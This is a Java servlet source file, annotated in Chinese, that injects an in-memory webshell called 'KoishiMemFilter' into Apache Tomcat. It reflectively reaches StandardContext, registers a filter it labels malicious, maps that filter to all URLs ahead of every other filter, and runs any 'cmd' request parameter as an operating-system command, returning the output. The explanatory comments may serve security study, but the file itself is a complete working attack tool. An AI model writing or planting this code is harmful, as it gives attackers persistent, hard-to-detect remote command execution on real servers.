package com.tomcat.memshell.Filter;

import com.tomcat.util.ClassUtil;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

public class KoishiMemFilter extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String filterName = "koishi";
        // 通过 request 获取 ServletContext 对象
        ServletContext servletContext = req.getSession().getServletContext();
        // 首先判断名字是否存在，如果不存在我们就进行注入
        if (servletContext.getFilterRegistration(filterName) == null) {
            try {
            /**
            流程 ApplicationContextFacade->ApplicationContext->StandardContext
            */
            // 1.获取 context
                Field contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                // ApplicationContext 为 ServletContext 的实现类,这里下面通过反射获取 servletContext 的 context 中的具体属性值
                ApplicationContext applicationContext = (ApplicationContext) contextField.get(servletContext);
                //这里同理，继续反射获取context中的属性值
                Field applicationField = applicationContext.getClass().getDeclaredField("context");
                applicationField.setAccessible(true);
                //最终在这里 这样我们就获取到了 StandardContext 下的 HashMap 类型的 filterDefs
                StandardContext standardContext = (StandardContext) applicationField.get(applicationContext);

/** 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象（就加载一个好像取得的 context 也没问题）
                StandardContext o = null;

                while (o == null) {
                    Field f = servletContext.getClass().getDeclaredField("context");
                    f.setAccessible(true);
                    Object object = f.get(servletContext);
                    if (object instanceof ServletContext) {
                        servletContext = (ServletContext) object;
                    } else if (object instanceof StandardContext) {
                        o = (StandardContext) object;
                    }
                }
 */


            // 2.创建自定义的Filter对象
            // Tomcat 包下的 ClassUtil 的继承了类加载器，可以用来专门加载Spring下的类
            // Class<?> filterClass = ClassUtil.getClass(ClassUtil.FILTER_STRING);

            //恶意 filter
                Filter filter = new Filter() {
                    @Override
                    public void init(FilterConfig filterConfig) throws ServletException {
                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                        HttpServletRequest req = (HttpServletRequest) servletRequest;
                        if (req.getParameter("cmd") != null){
                            byte[] bytes = new byte[1024];
                            //Process process = new ProcessBuilder("bash","-c",req.getParameter("cmd")).start();
                            Process process = new ProcessBuilder(req.getParameter("cmd")).start();
                            int len = process.getInputStream().read(bytes);
                            servletResponse.getWriter().write(new String(bytes,0,len));
                            process.destroy();
                            return;
                        }
                        filterChain.doFilter(servletRequest,servletResponse);
                    }

                    @Override
                    public void destroy() {
                    }
                };

            // 创建FilterDef
                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName(filterName);
                //filterDef.setFilter((Filter)filterClass.newInstance());
                filterDef.setFilter(filter);
                //filterDef.setFilterClass(filterClass.getName());
                filterDef.setFilterClass(filter.getClass().getName());

            // 创建ApplicationFilterConfig
                Constructor<?>[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();
                constructor[0].setAccessible(true);
                ApplicationFilterConfig config = (ApplicationFilterConfig) constructor[0].newInstance(standardContext, filterDef);

            // 创建FilterMap
                FilterMap filterMap = new FilterMap();
                filterMap.setFilterName(filterName);
                // * 或者 /* 都会匹配所有url路径，这就使内存马再任意页面都可执行
                filterMap.addURLPattern("*");
                /**
                 * Filter拦截方式配置
                 * REQUEST：默认值。浏览器直接请求资源（下面设置成这个的目的应该也是为了直接请求资源，不做过多处理）
                 * FORWARD：转发访问资源
                 * INCLUDE：包含访问资源
                 * ERROR：错误跳转资源
                 * ASYNC：异步访问资源
                 * */
                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                // 反射将ApplicationFilterConfig放入StandardContext中的filterConfigs中
                Field configfield = standardContext.getClass().getDeclaredField("filterConfigs");
                configfield.setAccessible(true);
                // 直接赋值会把别的服务给覆盖掉, 取出再赋值
                HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) configfield.get(standardContext);
                filterConfigs.put(filterName, config);

                standardContext.addFilterDef(filterDef);
                // 将我们的 filterMap 写到第一个
                standardContext.addFilterMapBefore(filterMap);

                resp.getOutputStream().write("inject KoishiMemFilter success !".getBytes());
                resp.getOutputStream().flush();
                resp.getOutputStream().close();


            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }

    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Filter 初始化创建");
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("执行过滤操作");
        filterChain.doFilter(servletRequest,servletResponse);
    }

    public void destroy() {}


}